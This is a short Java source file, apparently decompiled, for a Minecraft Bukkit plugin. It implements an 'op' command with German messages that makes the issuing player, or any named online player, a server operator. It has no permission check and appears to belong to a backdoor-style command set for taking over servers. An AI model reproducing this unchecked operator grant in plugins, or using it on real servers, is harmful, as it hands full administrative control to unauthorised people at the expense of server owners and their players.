package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_OP extends CommandBase {

    public Command_OP() {
        super("op", "<Spieler>", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 1) {
            p.setOp(true);
            p.sendMessage(Start.INSTANCE.chatPrefix + "Du hast nun OP Rechte!");
        } else if (args.length == 2) {
            try {
                Bukkit.getPlayer(args[1]).setOp(true);
                p.sendMessage(Start.INSTANCE.chatPrefix + "Dieser Spieler hat nun OP Rechte!");
            } catch (Exception var4) {
                p.sendMessage(Start.INSTANCE.chatPrefix + ChatColor.RED + "Dieser Spieler ist nicht online!");
            }
        } else {
            p.sendMessage(Start.INSTANCE.chatPrefix + "§cBitte überprüfe deine Syntax.");
        }
    }

}
